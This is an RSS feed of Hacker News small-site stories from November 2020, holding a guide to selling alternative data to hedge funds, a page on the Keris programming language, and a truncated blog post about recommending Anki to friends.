<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 02 Nov 2020 16:34:44 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 02 Nov 2020 16:34:44 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[The Guide to Selling Data to Hedge Funds – AlternativeData]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24958215">thread link</a>) | @r_singh
<br/>
November 1, 2020 | https://alternativedata.org/the-ultimate-guide-to-selling-data-to-hedge-funds/ | <a href="https://web.archive.org/web/*/https://alternativedata.org/the-ultimate-guide-to-selling-data-to-hedge-funds/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <h2><b>How to sell data to hedge funds</b></h2>

<p><img src="https://alternativedata.org/wp-content/uploads/2017/08/Crossing-the-Chasm-Selling-Data-to-Investors-01.png" alt="" width="5705" height="4298"></p><h3><b>Step 1: Know your audience</b></h3>
<p><span>Hedge funds are not all the same. Below are the main types.</span></p><h5>Quantitative Investing (a.k.a. Quant, Systematic, Algorithmic)</h5>
<p><span>Quant funds utilize automated trading strategies based on algorithms and data. They are not looking to be right on every trade. They just want to be right more than they’re wrong and trade a lot of securities.</span>

<span>They typically purchase data that</span></p><ul>
 	<li><span>Apply to 100s or 1,000s of securities</span></li>
</ul>
<ul>
 	<li><span>Has a long history of data they can backtest</span></li>
</ul>
<ul>
 	<li><span>Is published frequently. 5 years of historical data, published quarterly provides a weaker backtest than 5 years of historical data published daily</span></li>
</ul>
<p><span>The best part about selling to quant funds is that their business model is based on data, so they employ professionals to speak to data vendors, understand their data and make compelling proposals when valuable. </span>

<span>The difficult part about selling to quant funds is if your dataset does not meet the above attributes, you’re probably not going to sell them anything. But you’ll learn that pretty fast. </span>

<span>More Info:&nbsp;</span><a href="http://www.streetofwalls.com/finance-training-courses/quantitative-hedge-fund-training/quant-firms/"><span>Largest Quantitative Hedge Funds</span></a></p><h5>Fundamental Investing (a.k.a. Discretionary, Stock-Picking)</h5>
<h6><i><span>Platform Funds (a.k.a. Pod, Multi-Manager, Multi-Strategy)</span></i></h6>
<p><span>Platform Funds consist of many individual teams of PMs &amp; Analysts who share centralized resources such as assets under management, trading &amp; execution, compliance, data, office space, training and more. </span>

<span>Platform funds with discretionary strategies typically purchase data that</span></p><ul>
 	<li><span>Is highly correlated with a company KPI (“Key Performance Indicator”) or key investor question of specific securities</span></li>
</ul>
<ul>
 	<li><span>Has a history of data they can backtest</span></li>
</ul>
<ul>
 	<li><span>Is unique</span></li>
</ul>
<p><span>Since platform funds provide infrastructure shared among their investing teams (or “pods”), they often employ data sourcing professionals similar to Quant funds. These are also quick and pleasant conversations to have that require minimal sales infrastructure.</span>

<span>More info:&nbsp;</span><a href="https://www.wallstreetoasis.com/forums/what-ive-learned-about-hedge-fund-structure-and-compensation"><span>Multi-Manager Funds</span></a></p><h6><i><span>Long/Short Equity Hedge Funds</span></i></h6>
<p><span>Long/Short Equity Hedge funds pick stocks. They tend to purchase similar data to Platform Funds</span>

<span>The Long/Short Equity Hedge Funds who spend the most on data:</span></p><ul>
 	<li><span>Have a large amount of Assets Under Management (AUM)</span></li>
</ul>
<ul>
 	<li><span>Trade frequently. The more often they trade, the more data they want to look at. A rough proxy for this is “Turnover %” on a 13F database such as </span><a href="https://whalewisdom.com/"><span>Whale Wisdom</span></a></li>
</ul>
<ul>
 	<li><span>Make concentrated bets. The larger their positions, the more they can spend. A proxy for this is “% of Portfolio” on Whale Wisdom</span></li>
</ul>
<p><span>More Info: </span><a href="http://www.institutionalinvestorsalpha.com/profile/3287866/4689/hedge-fund-100-firm-profiles.html"><span>Institutional Investors Top 100 Hedge Funds</span></a><span> (also includes Quant and Platform funds)

</span></p><h6><i><span>Event Driven Funds</span></i></h6>
<p><span>These firms invest based on specific catalysts such as a merger, acquisition, bankruptcy, spinoff or legislation. If your dataset allows investors unique insights into key events, they may be a good match for Event Driven Funds.</span></p><h5><strong>Other Types of Funds</strong></h5>
<p><span>The above designations are neither mutually exclusive nor collectively exhaustive. Many funds are combinations of the above or something else entirely, including:</span></p><ul>
 	<li><span>Long Only/Mutual Funds: much longer term oriented investors with a different business model</span></li>
 	<li>Macro Funds: These firms invest across broader trends that affect a lot of stocks. If your data speaks to broader trends like inflation, currencies, weather, interest rates or global events they may be a good match for Macro Funds.</li>
</ul>
<ul>
 	<li><span>Credit Funds: invest in debt</span></li>
</ul>
<ul>
 	<li><span>Family Offices: manage funds of an individual family or group of families</span></li>
</ul>
<ul>
 	<li><span>Fund of Funds: invests in other funds</span></li>
</ul>
<ul>
 	<li><span>Sovereign Wealth Funds / Pension Funds: manages money of countries, endowments</span></li>
</ul>
<ul>
 	<li><span>Private Equity/Venture Capital: make large investments in mainly private companies</span></li>
</ul>
<h3><b>Step 2: Understand key use cases for your data&nbsp;</b></h3>
<p><span>For background on why hedge funds value alternative data, see </span><a href="http://mattturck.com/the-new-gold-rush-wall-street-wants-your-data/"><span>Matt Turck’s excellent piece on the subject</span></a><span>. High level, it helps to divide the institutional investor market into quantitative funds and discretionary funds, as the two have very different requirements and use cases for data.</span>

<span>To attract quant funds, your data should speak to a lot of companies and have a long time series. A good example is a panel of consumer transactions touching many public companies, that has a positive correlation with share prices. Once a quant fund has an understanding of your dataset, they can run a backtest to establish value. </span>

<span>To attract fundamental investors, it’s easier to start with a few case studies about specific public companies. Pick a few that your data can best speak to and run a correlation to their KPIs (e.g., Revenue, GMV, Gross Profit). The best companies are:</span></p><ul>
 	<li><span>Stock price is driven by a key metric or investor question your data can speak to</span></li>
</ul>
<ul>
 	<li><span>Large market cap / average trading volume</span></li>
</ul>
<ul>
 	<li><span>High volatility </span></li>
</ul>
<ul>
 	<li><span>Always nice: high hedge fund ownership (examples on </span><a href="https://insight.factset.com/hubfs/Hedge%20Fund%20Ownership/Hedge%20Fund%20Ownership%20Q4%202016_2.18.17.pdf"><span>page 5</span></a><span>)</span></li>
</ul>
<p><span>The right company will vary by dataset, but a few examples:</span></p><ul>
 	<li><span>Panel of Mobile App Usage: Correlate to observed app usage with reported DAUs for SnapChat, Facebook or Twitter</span></li>
</ul>
<ul>
 	<li><span>Panel of Consumer Transactions: Correlate to same store sales of retailers or GMV/sales of ecommerce companies </span></li>
</ul>
<ul>
 	<li><span>Social Sentiment: Correlate shifts in sentiment to revenue or share price of consumer / apparel brand companies</span></li>
</ul>
<h3><b>Step 3: Start with early adopters: quant funds and platform funds</b></h3>
<p><span>Both types of organizations employ teams of people looking to speak with data owners, can move quickly and offer you a price for your data. </span>

<b>You can speak to these people directly and don’t need to work with a data broker or other intermediary, who can demand a revenue share of 50% or more. </b></p><h3><b>Step 4: Sign up early adopters quickly with a limited distribution.</b></h3>
<p><span>Selling data is a multi-stage game. Price discovery and productization can take years. Don’t overthink your first contracts or hold out for the last dollar. Speak to a handful of early adopters, negotiate fair, 1 year contracts with a limited distribution, say 5-10 funds. You can decide the specific number based on conversations with the funds.</span>

<span>Do it quickly so you can then focus your your time and resources on understanding exactly how investors are using your data and determine your strategy when renewals come around.</span></p><h3><b>Step 5: Productize your data</b></h3>
<p><span>Quant, platform and other large hedge funds employ data teams who can extract value from data in nearly any format. Selling into a broader audience of funds requires additional QA and analysis investments into your data product. For more information on developing this team see our post on How to </span><a href="https://alternativedata.org/how-yipitdata-integrates-investment-analysts-data-analysts-and-engineers/"><span>Integrate Investment Analysts, Data Analysts and Engineers</span></a><span>.</span>

<span>Productizing your data means providing additional QA and analysis to enable you to understand it’s value and enable a fund without a large data team to extract value from it. </span>

<span>Productizing your data, regardless of your customer distribution, will make it easier to use by more individuals at your customers, increasing its value.</span></p><h3><b>Step 6: Determine the size of your eventual market</b></h3>
<p><span>Once your first year contract is up, you will need to decide whether you want to expand the size of your distribution. The more funds you sell to, the less valuable your data will be to your customers.</span>

<span>Reasons you may be able to increase your distribution and sell to more types of funds:</span></p><ul>
 	<li><span>It is the #1 dataset of its kind</span></li>
</ul>
<ul>
 	<li><span>Your dataset applies to lots and lots of companies</span></li>
</ul>
<ul>
 	<li><span>The data is granular and multi-dimensional. It’s more than a single datapoint and different types of investors use it to answer different types of questions</span></li>
</ul>
<ul>
 	<li><span>You can sell other services on top of the data</span></li>
</ul>
<ul>
 	<li><span>Compliance departments generally prefer datasets with a broader distribution</span></li>
</ul>
<ul>
 	<li><span>You can develop different data products for different customer types at different price points, so not everyone is getting the same experience </span></li>
</ul>
<ul>
 	<li><span>Diversify your revenue stream across more customers</span></li>
</ul>
<p><span>Reasons you may want to maintain a limited distribution: </span></p><ul>
 	<li><span>Reduce complexity</span></li>
</ul>
<ul>
 	<li><span>Reduce need for marketing, sales and customer service expenses</span></li>
</ul>
<ul>
 	<li><span>Enjoy higher ASP, higher margins</span></li>
</ul>
<ul>
 	<li><span>The primary use case of your data is a KPI estimate, which is more quickly commoditized than a granular dataset. Are you providing a revenue estimate or a way to understand an entire industry?</span></li>
</ul>
<h2><b>Frequently Asked Questions</b></h2>
<h3><b>How much money will I make?</b></h3>
<p><span>Reasons you may have unrealistic expectations of the value of your dataset:</span></p><ul>
 	<li><span>The value of your dataset will depend heavily on details such as accuracy, time series, compliance, release schedule</span></li>
</ul>
<ul>
 	<li><span>It will also depend on factors specific to the target company such as the existence of competitor datasets, the precision of sellside consensus, key investor questions, or the existence of legal/macro/regulatory overhangs</span></li>
</ul>
<ul>
 	<li><span>Investors will pay a large premium for the #1 dataset in a category. Are you #1?</span></li>
</ul>
<ul>
 	<li><span>Rumors of datasets commanding enormous premiums are more viral than ones about datasets nobody wants </span></li>
</ul>
<h3><b>What about contracts and compliance?</b></h3>
<p><span>Hedge fund customers will demand certain representations about your dataset. The </span><a href="http://yipitdata.com/agreements/msa"><span>YipitData Master Services Agreement</span></a><span> can give you a sense of what to expect. </span>

<span>You should consult a lawyer to help you with contracts relating to your specific dataset and to help you through your customer compliance reviews.</span><span>
</span><b></b></p><h3><b>What should I never do?</b></h3>
<p><span>Provide material, non-public information in violation of securities laws or personally identifiable information.</span>

<span>Provide misleading, doctored or “data-mined” historical correlations.</span>

<span>Conceal significant data outages or other issues that may affect your data's accuracy.</span></p><h2><b>CONCLUSION</b></h2>
<p><span>We think a reasonable go-to-market strategy for hedge funds is:</span></p><ul>
 	<li><span>Start with platform funds and quant funds</span></li>
</ul>
<ul>
 	<li><span>Set up one year contracts with a limited number (5-10) of buyers as soon as possible</span></li>
</ul>
<ul>
 	<li><span>Spend your next year productizing your data and learning about its use cases</span></li>
</ul>
<ul>
 	<li><span>Determine whether or not you want to expand the size of your distribution</span></li>
</ul>
<p><b>If you believe you have data that may be of interest to hedge funds, we would be happy to speak with you, and if you are interested, refer you to hedge funds who have expressed interest in alternative data. Email me at: </b><a href="mailto:jim@alternativedata.org"><b>jim@alternativedata.org</b></a>

___</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://alternativedata.org/the-ultimate-guide-to-selling-data-to-hedge-funds/">https://alternativedata.org/the-ultimate-guide-to-selling-data-to-hedge-funds/</a></em></p>]]>
            </description>
            <link>https://alternativedata.org/the-ultimate-guide-to-selling-data-to-hedge-funds/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24958215</guid>
            <pubDate>Sun, 01 Nov 2020 09:11:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What is the real cost of personal data protection?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957830">thread link</a>) | @msndmnnn
<br/>
November 1, 2020 | http://www.ronaldjjwong.com/2020/10/31/lazadas-personal-data-breach-and-rethinking-cost-benefit-of-pdpa-compliance/ | <a href="https://web.archive.org/web/*/http://www.ronaldjjwong.com/2020/10/31/lazadas-personal-data-breach-and-rethinking-cost-benefit-of-pdpa-compliance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>http://www.ronaldjjwong.com/2020/10/31/lazadas-personal-data-breach-and-rethinking-cost-benefit-of-pdpa-compliance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957830</guid>
            <pubDate>Sun, 01 Nov 2020 07:37:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Programming Language Keris]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24957656">thread link</a>) | @danny00
<br/>
October 31, 2020 | http://zenger.org/keris/index.html | <a href="https://web.archive.org/web/*/http://zenger.org/keris/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="100%">
  <tbody>
    <tr>
      <td>
      
      <br>
      </td>
      <td>
      <table>
        <tbody>
          <tr>
            <td></td>
          </tr>
          <tr>
            <td><img src="http://zenger.org/keris/images/white_topleft.gif" alt="" width="8" height="8"></td>
            <td></td>
            <td><img src="http://zenger.org/keris/images/white_topright.gif" alt="" width="8" height="8"></td>
          </tr>
          <tr>
            <td></td>
            <td><span face="Times,serif" size="+2">
            <b>The Programming Language Keris</b>
            </span></td>
            <td></td>
          </tr>
          <tr>
            <td><img src="http://zenger.org/keris/images/white_botleft.gif" alt="" width="8" height="8"></td>
            <td></td>
            <td><img src="http://zenger.org/keris/images/white_botright.gif" alt="" width="8" height="8"></td>
          </tr>
          <tr>
            <td></td>
          </tr>
          <tr>
            <td><img src="http://zenger.org/keris/images/white_topleft.gif" alt="" width="8" height="8"></td>
            <td></td>
            <td><img src="http://zenger.org/keris/images/white_topright.gif" alt="" width="8" height="8"></td>
          </tr>
          <tr>
            <td></td>
            <td>

<table>
  <tbody><tr>
  	<td colspan="2">
      <span face="Times,serif" size="+1">
      <b>&nbsp;1&nbsp; Overview</b>
      </span>
    </td>
  </tr>
  <tr>
  	<td>
    </td><td><span face="Times,serif">
The experimental programming language Keris extends Java with explicit support
for software evolution. Keris introduces extensible modules as the basic
building blocks for software. Modules are composed hierarchically revealing
explicitly the architecture of systems. A distinct feature of the module
design is that modules do not get linked manually. Instead, the wiring of
modules gets infered. The module assembly and refinement mechanism of Keris
is not restricted to the unanticipated extensibility of atomic modules. It
also allows to extend fully linked systems by replacing selected submodules
with compatible versions without needing to relink the full system.
Extensibility is type-safe and non-invasive; i.e. the extension of a module
preserves the original version and does not require access to source code.
<br>

</span><br></td></tr><tr>
  <td colspan="2">
	<span face="Times,serif" size="+1">
	<b>&nbsp;2&nbsp; Quick Tour</b>
	</span>
  </td>
</tr>
<tr>
  <td>
  </td><td><span face="Times,serif">

A <a href="http://zenger.org/keris/tour.html">quick tour</a> through the main features of Keris is available.
It briefly explains how systems are developed and evolved using Keris' extensible
modules.
<br>

</span><br></td></tr><tr>
  <td colspan="2">
	<span face="Times,serif" size="+1">
	<b>&nbsp;3&nbsp; Documentation</b>
	</span>
  </td>
</tr>
<tr>
  <td>
  </td><td><span face="Times,serif">

The following selection of papers describe the motivation, the design, and the
implementation of Keris, as well as technical background information on related
topics.
</span><p><span face="Times,serif">

<table>
  <tbody><tr>
  <td></td>
  <td><span face="Times,serif">
	<b>Programming Language Abstractions for Extensible Software Components</b><br>
	Matthias Zenger.<br>
	PhD Thesis, No. 2930, EPFL, Switzerland, March 2004.<br>
 	<a href="http://zenger.gmxhome.de/papers/thesis.pdf" title="PDF Download">[PDF Version]</a>
 	</span>
  </td>
  </tr><tr>
  <td></td>
  </tr>
  
  <tr>
  <td></td>
  <td><span face="Times,serif">
	<b>A Nominal Theory of Objects with Dependent Types</b><br>
	Martin Odersky, Vincent Cremet, Christine Röckl, Matthias Zenger.<br>
	<i>European Conference on Object-Oriented Programming</i>, Darmstadt, Germany, July 2003.<br>
	© Springer-Verlag (<a href="http://www.springer.de/comp/lncs/index.html">LNCS series</a>).<br>
	<i>Workshop on Foundations of Object-Oriented Languages</i>, New Orleans, January 2003.<br>
	Technical Report IC/2002/070.<br>
 	<a href="http://zenger.gmxhome.de/papers/ecoop03.pdf" title="PDF Download">[PDF Conference]</a>
 	<a href="http://zenger.gmxhome.de/papers/fool03.pdf" title="PDF Download">[PDF Workshop]</a>
 	<a href="http://zenger.gmxhome.de/papers/tr_nto.pdf" title="PDF Download">[PDF Technical Report]</a>
   	</span>
  </td>
  </tr>
  <tr>
  <td></td>
  </tr>
  <tr>
  <td></td>
  <td><span face="Times,serif">
	<b>Evolving Software with Extensible Modules</b><br>
	Matthias Zenger.<br>
	<i>International Workshop on Unanticipated Software Evolution</i>,
    Málaga, Spain, June 2002.<br>
   	Extended version accepted for publication in <i>Software Maintenance and Evolution: Research and Practice
   	(Special Issue on Unanticipated Software Evolution)</i>.<br>
    <a href="http://zenger.gmxhome.de/papers/use02.pdf" title="PDF Download">[PDF Workshop]</a>
    [PDF Journal]
   	</span>
  </td>
  </tr>
  <tr>
  <td></td>
  </tr>
  <tr>
  <td></td>
  <td><span face="Times,serif">
	<b>Type-Safe Prototype-Based Component Evolution</b><br>
	Matthias Zenger.<br>
	<i>European Conference on Object-Oriented Programming</i>, Málaga, Spain, June 2002.<br>
    © Springer-Verlag (<a href="http://www.springer.de/comp/lncs/index.html">LNCS series</a>).<br>
    Technical Report IC/2002/014, EPFL, April 2002.<br>
   	<a href="http://zenger.gmxhome.de/papers/ecoop02.pdf" title="PDF Download (c) Springer-Verlag">[PDF Conference]</a>
   	<a href="http://zenger.gmxhome.de/papers/tr_components.pdf" title="PDF Download">[PDF Technical Report]</a>
   	</span>
  </td>
  </tr>
</tbody></table>

</span><br></p></td></tr><tr>
  <td colspan="2">
	<span face="Times,serif" size="+1">
	<b>&nbsp;4&nbsp; Implementation</b>
	</span>
  </td>
</tr>
<tr>
  <td>
  </td><td><span face="Times,serif">

You can download a beta version of the Keris compiler <i>KeCo</i> together with
the extensible Java compiler <i>JaCo</i> here:


<br>

The Keris compiler is implemented as an extension of the extensible
Java compiler <i>JaCo</i> (a reimplementation of the compiler available
<a href="http://zenger.org/jaco/">here</a>). Both, JaCo and
its extension KeCo are implemented in Keris. The source code for both
systems is available for download. It consists of approximately 55000
lines of code split up into 120 source files occupying 3.2MB.
<a href="http://jakarta.apache.org/ant/">Jakarta Ant</a> is required for
executing the build script which bootstraps the compiler.


<br>

Keris is a conservative extension of Java 2. Keris modules are compiled to
standard Java classfiles. The execution of Keris modules does not require a
special runtime system, nor does it rely on a custom class-loader. For running
the compiler or for executing Keris modules, only a Java Runtime Environment 
of at least version 1.3 is required.
<br>

</span><br></td></tr><tr>
  <td colspan="2">
	<span face="Times,serif" size="+1">
	<b>&nbsp;5&nbsp; About the Name <i>Keris</i></b>
	</span>
  </td>
</tr>
<tr>
  <td>
  </td><td><span face="Times,serif">

A Keris is a double edged dagger originating
in the Javanese culture. It was considered a magical weapon, filled with
great spiritual power. Today it is an object of reverence and respect,
symbolizing strength and safety. You can read more about it
<a href="http://www.nikhef.nl/~tonvr/keris/">here</a>.<br>

</span><br></td></tr><tr>
  <td colspan="2">
	<span face="Times,serif" size="+1">
	<b>&nbsp;6&nbsp; Contact</b>
	</span>
  </td>
</tr>
<tr>
  <td>
  </td><td><span face="Times,serif">

Please contact
<a href="http://zenger.org/">Matthias Zenger</a> by
<a href="mailto:software@zenger.org">e-mail</a>
for comments or further questions.


<img src="http://zenger.org/keris/images/arrow_l.gif" alt="" width="20" height="21">
</span></td>
</tr>
</tbody></table>
            
            </td>
            <td></td>
          </tr>
          <tr>
            <td><img src="http://zenger.org/keris/images/white_botleft.gif" alt="" width="8" height="8"></td>
            <td></td>
            <td><img src="http://zenger.org/keris/images/white_botright.gif" alt="" width="8" height="8"></td>
          </tr>
        </tbody>
      </table>
      </td>
    </tr>
  </tbody>
</div></div>]]>
            </description>
            <link>http://zenger.org/keris/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24957656</guid>
            <pubDate>Sun, 01 Nov 2020 06:46:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I No Longer Tell My Friends about Anki/SuperMemo]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 74 (<a href="https://news.ycombinator.com/item?id=24957617">thread link</a>) | @kioleanu
<br/>
October 31, 2020 | https://www.masterhowtolearn.com/2020-10-31-why-i-no-longer-tell-my-friends-about-anki-supermemo/ | <a href="https://web.archive.org/web/*/https://www.masterhowtolearn.com/2020-10-31-why-i-no-longer-tell-my-friends-about-anki-supermemo/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>This article <a href="https://www.lesswrong.com/posts/6NvbSwuSAooQxxf7f/beware-of-other-optimizing">Beware of Other-Optimizing</a> by Eliezer Yudkowsky is highly illuminating. I recommend you read it through the lens of “recommending Anki to a friend.” This article is about the problems of giving advice on how to learn.</p>
<h2>Spreading the “gospel” to the world</h2>
<p>If you deeply believe something, along the lines of “if everyone did it, the world would be much better off.” and have tried convincing other people to do that thing, then you will realize it’s almost impossible to change others’ opinions or behaviors.</p>
<p>Maybe you’re not that ambitious to convince everyone, so you start small: you share it with your friends, but then discovered nobody actually cares or realizes its significance. A mild version is like <a href="https://www.deathbulge.com/comics/206">showing your favorite TV show and they don’t care</a>:</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/26c8c80614f9b9a1a0a8f6e2ff1e17c2/acb04/deathbulge.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="deathbulge" title="deathbulge" src="https://www.masterhowtolearn.com/static/26c8c80614f9b9a1a0a8f6e2ff1e17c2/1c72d/deathbulge.jpg" srcset="https://www.masterhowtolearn.com/static/26c8c80614f9b9a1a0a8f6e2ff1e17c2/a80bd/deathbulge.jpg 148w,
https://www.masterhowtolearn.com/static/26c8c80614f9b9a1a0a8f6e2ff1e17c2/1c91a/deathbulge.jpg 295w,
https://www.masterhowtolearn.com/static/26c8c80614f9b9a1a0a8f6e2ff1e17c2/1c72d/deathbulge.jpg 590w,
https://www.masterhowtolearn.com/static/26c8c80614f9b9a1a0a8f6e2ff1e17c2/acb04/deathbulge.jpg 750w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>My faith in evidence-based learning strategies is informed by my personal experience and <a href="https://www.masterhowtolearn.com/2020-02-25-how-to-learn-about-meta-learning-my-resource-list">my meta-learning list</a>. I wholeheartedly believe Spaced Repetition Software (SRS) like SuperMemo and Anki is the key to effective and efficient learning. If you believe education is the future, then the knowledge about evidence-based learning strategies is one big key to unlocking that future, both individually and collectively.</p>
<h2>“Doing this every day seems very tiring.”</h2>
<p>Two years ago I was doing my Anki reps. One friend glanced over and was interested in what I was doing.</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/443ff24d4c08fb6e97f3db4438a49b2e/ee745/myTime.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="My time has come" title="My time has come" src="https://www.masterhowtolearn.com/static/443ff24d4c08fb6e97f3db4438a49b2e/1c72d/myTime.jpg" srcset="https://www.masterhowtolearn.com/static/443ff24d4c08fb6e97f3db4438a49b2e/a80bd/myTime.jpg 148w,
https://www.masterhowtolearn.com/static/443ff24d4c08fb6e97f3db4438a49b2e/1c91a/myTime.jpg 295w,
https://www.masterhowtolearn.com/static/443ff24d4c08fb6e97f3db4438a49b2e/1c72d/myTime.jpg 590w,
https://www.masterhowtolearn.com/static/443ff24d4c08fb6e97f3db4438a49b2e/ee745/myTime.jpg 660w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>We ate lunch together while I was giving her a little presentation. I talked <em>very enthusiastically</em> about spaced repetition, basic memory science and Anki operations. Of course I had to show her the infamous forgetting curve:</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/2abe95310027f94ad36981994f56c65d/8aab1/forgetting-curve-wired-wozniak.webp" target="_blank" rel="noopener">
    <span></span>
  <img alt="forgetting-curve" title="forgetting-curve" src="https://www.masterhowtolearn.com/static/2abe95310027f94ad36981994f56c65d/5ca24/forgetting-curve-wired-wozniak.webp" srcset="https://www.masterhowtolearn.com/static/2abe95310027f94ad36981994f56c65d/cbe2e/forgetting-curve-wired-wozniak.webp 148w,
https://www.masterhowtolearn.com/static/2abe95310027f94ad36981994f56c65d/3084c/forgetting-curve-wired-wozniak.webp 295w,
https://www.masterhowtolearn.com/static/2abe95310027f94ad36981994f56c65d/5ca24/forgetting-curve-wired-wozniak.webp 590w,
https://www.masterhowtolearn.com/static/2abe95310027f94ad36981994f56c65d/8aab1/forgetting-curve-wired-wozniak.webp 630w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>She sounded excited about the possibility of finally mastering a second language. But at one point she was confused:</p>
<blockquote>
<p>“If I hadn’t learned it how could I recall it from memory?”</p>
</blockquote>
<p>So I explained that assessment <strong><em>for</em></strong> learning (testing as a means of learning) is different from assessment <strong><em>of</em></strong> learning (finding out what you’ve learned). The act of “recalling from memory” is itself a learning process. Then I was aware that her confusion was probably due to a common misconception about memory: human memory works like computer memory:</p>
<blockquote>
<p>The functional architecture of how humans forget, remember, and learn is <strong>unlike</strong> the corresponding processes in man-made devices […] We think of ourselves as working like computers, we become prone to assuming that exposing ourselves to information and procedures will lead to storage (i.e., recording) of such information or procedures in our memories—that the information will write itself in one’s memory.</p>
<p>If we think of human memory equals to memory in a computer, we are unlikely to appreciate that retrieving information from our memory increases the subsequent accessibility of that information, while retrieving information from computer memory leaves the status of that information unperturbed. <a href="https://www.taylorfrancis.com/books/e/9780203842539/chapters/10.4324%2F9780203842539-6">On the Symbiosis of Remembering, Forgetting, and Learning</a></p>
</blockquote>
<p>Side note: this story might give you the impression that I liked to show off what I know. No not really. I like to be convinced with evidence, and I thought others were the same. I was wrong. Also, I included the above quotes for the sake of convincing you, the reader. I didn’t obfuscate the subject matter with phrases like assessment <strong><em>for</em></strong> learning and assessment <strong><em>of</em></strong> learning.</p>
<p>She looked… befuddled. Sort of like this:</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/e459a547d1aa99ea034a06ea3f4f1f13/c08c5/AwkwardSmile.jpg" target="_blank" rel="noopener">
    <span></span>
  <img alt="awkwardSmile" title="awkwardSmile" src="https://www.masterhowtolearn.com/static/e459a547d1aa99ea034a06ea3f4f1f13/1c72d/AwkwardSmile.jpg" srcset="https://www.masterhowtolearn.com/static/e459a547d1aa99ea034a06ea3f4f1f13/a80bd/AwkwardSmile.jpg 148w,
https://www.masterhowtolearn.com/static/e459a547d1aa99ea034a06ea3f4f1f13/1c91a/AwkwardSmile.jpg 295w,
https://www.masterhowtolearn.com/static/e459a547d1aa99ea034a06ea3f4f1f13/1c72d/AwkwardSmile.jpg 590w,
https://www.masterhowtolearn.com/static/e459a547d1aa99ea034a06ea3f4f1f13/c08c5/AwkwardSmile.jpg 640w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p>I remember I was so excited and nervous at the same time that I was fumbling for words, trying to simplify it as much as I could. In retrospect, I was making things worse.</p>
<p>She’d listen to me quite intently, signaling that she was thinking and trying to figure it out, but I could tell she was still confused. And the more I explained, the deeper the rabbit hole went (like keep clicking hyperlinks in Wikipedia), and the more confused she became, so I stopped talking to stop making the whole situation uncomfortable. The following monologue is how I imagine what she was thinking at the time:</p>
<blockquote>
<p>“He’s so passionate about this stuff and was so sure of himself that I guess he’s right.”</p>
</blockquote>
<blockquote>
<p>“I’m not really sure what he means. I do want to learn Japanese but the stuff he’s talking about is so confusing…”</p>
</blockquote>
<blockquote>
<p>“I was indeed interested in the beginning when I asked him, but I don’t really care at this point. I’m just going to pretend I understand and end this whole conversation asap.”</p>
</blockquote>
<p>I will never forget what she said at one point,</p>
<blockquote>
<p>“Doing this every day seems very tiring.”</p>
</blockquote>
<p>I was like “Yeah…” I never followed up on her progress. I figured if she was truly interested, when she bumped into problem she would ask for my help. As expected, we never talked about it and I never mentioned Anki again.</p>
<p><span>
      <a href="https://www.masterhowtolearn.com/static/7a936abffcd1a452478dca75a9f1ec62/0b533/sadFrog.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="sadFrog" title="sadFrog" src="https://www.masterhowtolearn.com/static/7a936abffcd1a452478dca75a9f1ec62/0b533/sadFrog.png" srcset="https://www.masterhowtolearn.com/static/7a936abffcd1a452478dca75a9f1ec62/12f09/sadFrog.png 148w,
https://www.masterhowtolearn.com/static/7a936abffcd1a452478dca75a9f1ec62/e4a3f/sadFrog.png 295w,
https://www.masterhowtolearn.com/static/7a936abffcd1a452478dca75a9f1ec62/0b533/sadFrog.png 500w" sizes="(max-width: 500px) 100vw, 500px" loading="lazy">
  </a>
    </span></p>
<p>These has happened countless times. I usually look nonchalant on the outside but dying on the inside. People looked interested (probably due to my enthusiasm and it’s impolite to look otherwise) and then never actually bothered to use Anki. Some would actually try, make a few cards, do the reps for a few days and then say, “I tried and Anki doesn’t work.”</p>
